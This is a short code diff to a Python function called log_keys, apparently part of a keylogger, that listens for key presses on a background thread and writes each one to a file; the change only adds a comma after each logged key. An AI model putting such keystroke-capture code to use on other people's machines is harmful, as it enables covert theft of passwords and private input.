@@ -18,7 +18,7 @@ def log_keys():
                 write_this = '\n'
             else:
                 write_this = str(key)
-            f.write(write_this)
+            f.write(write_this + ",")
             
     listener = keyboard.Listener(on_press=on_press)
     listener.start()  # start to listen on a separate thread
